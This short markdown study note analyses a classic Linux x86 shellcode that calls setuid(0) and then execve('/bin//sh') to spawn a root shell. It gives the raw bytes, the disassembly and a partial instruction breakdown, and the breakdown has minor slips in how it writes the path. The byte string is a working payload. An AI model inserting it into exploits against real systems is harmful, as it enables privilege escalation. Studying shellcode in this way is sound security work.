## Shellcode analysis case 1

----

#### Shellcode - Spawns a root shell on Linux : [source](https://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html) 
```
\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52
\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89
\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80
```
```
Dissassembly-
0:  31 c0                   xor    eax,eax
2:  89 c3                   mov    ebx,eax
4:  b0 17                   mov    al,0x17
6:  cd 80                   int    0x80
8:  31 d2                   xor    edx,edx
a:  52                      push   edx
b:  68 6e 2f 73 68          push   0x68732f6e
10: 68 2f 2f 62 69          push   0x69622f2f
15: 89 e3                   mov    ebx,esp
17: 52                      push   edx
18: 53                      push   ebx
19: 89 e1                   mov    ecx,esp
1b: 8d 42 0b                lea    eax,[edx+0xb]
1e: cd 80                   int    0x80 
```
Breakdown-

```x86asm
xor    eax,eax ; zero's out the eax register
mov    ebx,eax
mov    al,0x17
int    0x80

;Pushed the text "\bin\sh" onto the stack which spawns the sh shell

push   0x68732f6e - little endian hex code "\sh"
push   0x69622f2f - little endian hex code "\bin"
```
